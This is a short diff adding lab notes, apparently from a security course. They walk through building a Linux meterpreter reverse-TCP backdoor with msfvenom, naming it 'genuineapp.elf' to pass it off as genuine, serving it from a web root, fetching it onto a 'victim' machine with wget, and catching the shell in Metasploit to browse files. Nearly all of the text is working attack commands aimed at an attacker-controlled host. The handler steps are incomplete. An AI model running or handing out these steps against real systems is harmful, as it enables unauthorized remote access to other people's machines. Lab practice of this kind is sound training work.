@@ -1,0 +1,31 @@
+Activity 2:
+IN Kali Linux: 
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.18.0.2 LPORT=4444 -f elf -o /var/www/html/genuineapp.elf
+
+In the victim machine:
+
+1. Download the backdoor malware
+
+wget http://172.18.0.2/genuineapp.elf 
+
+2. To check if it has been downloaded
+
+ls 
+
+3. Go back to Kali and start Metasploit
+
+msfconsole
+
+4. Set the LHOST and LPORT
+
+set LHOST 172.18.0.2
+set LPORT 4444
+
+5. At this stage we managed to fully get access to the victim machine. 
+
+6. In the Kali meterpreter session
+ls
+cd ..
+ls 
+cd foldername
